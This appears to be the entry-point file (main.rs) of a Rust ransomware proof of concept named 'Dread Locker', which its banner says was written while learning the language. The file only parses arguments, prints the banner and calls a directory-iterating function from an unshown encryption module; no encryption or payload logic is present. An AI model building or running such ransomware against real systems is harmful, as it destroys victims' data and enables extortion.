use std::env;
use std::process;
mod settings;
mod encryption_functions;
mod tests;
use crate::settings::Config;
use crate::encryption_functions::iterate_dir;
fn main() {
    let args: Vec<String> = env::args().collect();
    let mut config: Config = Config::new(args).unwrap_or_else(|err| {
        eprintln!("Syntax error: {}", err);
        process::exit(1);
        
    });
    style();
    iterate_dir(&mut config);
    
}
fn style() {
    println!("---------------------------------------");
    println!(r"\______Dread Locker version: 0.3______/");
    println!("---------------------------------------");
    println!("Simple ransomware PoC because I'm currently learning Rust and I figured why not!");
}

